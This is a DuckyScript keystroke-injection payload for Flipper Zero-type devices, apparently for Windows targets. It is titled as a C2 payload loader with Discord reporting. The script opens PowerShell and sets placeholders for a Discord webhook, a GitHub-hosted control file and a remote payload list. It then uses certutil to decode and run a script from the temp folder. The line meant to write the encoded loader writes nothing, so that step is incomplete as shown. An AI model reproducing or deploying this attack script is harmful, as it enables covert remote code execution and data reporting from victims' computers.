REM Title: C2 Payload Loader (pLoader) w Discord Reporting
REM Description: Remote (C2) Payload Loader with Discord Reporting. The Project
REM    allows you to IDLE, ACTIVATE, Change Timer Intervals, Change Execution Modes,
REM    Remotely CHANGE Payloads, and even activate the KILLSWITCH. All inputs below 
REM    are needed to start the script, unless know how to edit the Source. OMG and
REM    InfoSecREDD (REDD) are not responsible for the misuse of this Payload. This
REM    is for Educational Purposes only.
REM AUTHOR: InfoSecREDD
REM Version: 1.1
REM Category: Execution (REMOTE)
REM Compatibility: Flipper Zero AND DuckyScript Devices
REM Target: Windows

REM To use on Flipper Zero REM the DUCKY_LANG US from line below
DUCKY_LANG US
DELAY 2000
GUI r
DELAY 500
STRING powershell
ENTER
DELAY 2000
REM Put your Discord webhook below.
STRING $webhook = "DiscordWebhookHere"; 
REM C2 file must be hosted at GitHub unless you can edit the file. 1 = ON and 0 = OFF 
STRING $ccontrol = "C2FileHere";
REM Put your Remote List of Payloads below.
STRING $URLS = "URLFileListHere"; 
REM Put your Timer file below. 10-18000 Its counted in Minutes.
STRING $timer = "TimerFileHere"; 
REM OVERDRIVE - Overdrive allows the payloads to execute without prior payload finishing. 1 = ON and 0 = OFF
STRING $overdrive = "OverdriveFileHere"; 
REM Lets run this thing.
STRING $TempFile = "$env:TEMP\temp.ps1"; $File = "$env:TEMP\l.ps1"; echo  > "$TempFile"; certutil -f -decode "$TempFile" "$File" | out-null; & "$env:TEMP\l.ps1"
DELAY 1000
ENTER
